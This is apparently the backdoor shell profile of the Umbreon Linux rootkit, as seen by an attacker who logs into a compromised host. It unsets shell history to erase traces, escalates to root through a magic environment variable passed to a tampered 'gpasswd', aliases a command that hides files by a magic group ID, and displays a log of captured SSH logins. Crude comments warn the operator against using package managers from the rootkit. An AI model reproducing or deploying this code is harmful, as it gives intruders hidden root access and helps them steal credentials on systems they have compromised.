if ! tty -s ; then return ; fi # SFTP/noninteractive shell
GID=`id -g`
unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND
if [ $UID != 0 ] ; then exec env MAGIC_ENV=1 gpasswd; kill -9 $$; fi 
echo "version YWVmN2E3MWVhNjhkM2Q2MTAxZTY3NTdlMDczOTUxMjFlMzAzZjY0ZSAgLQo="
cat .umbreon-ascii

uver="2.21"

txtblk='\[\e[0;30m\]' # Black - Regular
txtred='\[\e[0;31m\]' # Red
txtgrn='\[\e[0;32m\]' # Green
txtylw='\[\e[0;33m\]' # Yellow
txtblu='\[\e[0;34m\]' # Blue
txtpur='\[\e[0;35m\]' # Purple
txtcyn='\[\e[0;36m\]' # Cyan
txtwht='\[\e[0;37m\]' # White
bldblk='\[\e[1;30m\]' # Black - Bold
bldred='\[\e[1;31m\]' # Red
bldgrn='\[\e[1;32m\]' # Green
bldylw='\[\e[1;33m\]' # Yellow
bldblu='\[\e[1;34m\]' # Blue
bldpur='\[\e[1;35m\]' # Purple
bldcyn='\[\e[1;36m\]' # Cyan
bldwht='\[\e[1;37m\]' # White
unkblk='\[\e[4;30m\]' # Black - Underline
undred='\[\e[4;31m\]' # Red
undgrn='\[\e[4;32m\]' # Green
undylw='\[\e[4;33m\]' # Yellow
undblu='\[\e[4;34m\]' # Blue
undpur='\[\e[4;35m\]' # Purple
undcyn='\[\e[4;36m\]' # Cyan
undwht='\[\e[4;37m\]' # White
bakblk='\[\e[40m\]'   # Black - Background
bakred='\[\e[41m\]'   # Red
bakgrn='\[\e[42m\]'   # Green
bakylw='\[\e[43m\]'   # Yellow
bakblu='\[\e[44m\]'   # Blue
bakpur='\[\e[45m\]'   # Purple
bakcyn='\[\e[46m\]'   # Cyan
bakwht='\[\e[47m\]'   # White
txtrst='\[\e[0m\]'    # Text Reset
CLEAR="\[\033[0m\]"

PROMPT_COMMAND='PS1="${txtgrn}[${bldcyn}`w -h|wc -l` ${txtgrn}users online ${txtylw}| ${bldcyn}`ps axHo pid|wc -l` ${txtgrn}processes running ${txtylw}| ${txtgrn}GID ${bldcyn}$GID${txtgrn}] -- ${bldwht}v${bldgrn}${uver}\n$txtgrn\u@\h:\w\\$ $CLEAR"'
export PATH=$HOME/bin:$PATH
w

echo '--SUCCESSFUL SSH LOGINS--'
tail -3 promptlog 2>/dev/null || echo "None yet."
echo '--                     --'

echo 'This is experimental software. Be very careful.'

# Some aliases for your own damn good
alias apt-get='echo -e "Don\x27t do that from the rkit, fucktard... you will fuck up the package db"; echo "If you REALLY wanna do that, setgid to 0 first and unalias this command."'
alias yum=apt-get
alias emerge=apt-get
alias zypper=apt-get
alias hidefile="chgrp $GID"
alias ls="ls -a"
